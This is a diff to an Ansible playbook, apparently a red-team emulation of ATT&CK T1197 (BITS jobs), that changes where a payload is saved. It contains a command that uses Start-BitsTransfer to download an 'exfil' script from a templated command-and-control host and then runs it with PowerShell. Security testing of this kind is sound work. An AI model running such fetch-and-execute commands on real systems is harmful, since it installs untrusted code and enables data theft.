@@ -8,14 +8,14 @@
       # If you want to use HTTPS, make sure remote certificate is valid or a add root ca if self-signed
       tags: CMD
       win_command: |
-        Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination %TEMP%\{{ exfil_script_windows }&powershell {{ exfil_script_windows }
+        Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination c:\temp\{{ exfil_script_windows }&powershell {{ exfil_script_windows }
     - name: sleep for 10 seconds and continue with play if download was blocked or not
       tags: always
       wait_for: timeout=10
       delegate_to: localhost
     - name: Check Payload downloaded
       tags: always
-      win_command: type %TEMP%\{{ exfil_script_windows }
+      win_command: type c:\temp\{{ exfil_script_windows }
       register: T1197
     - name: check if playbook was successfull
       tags: always
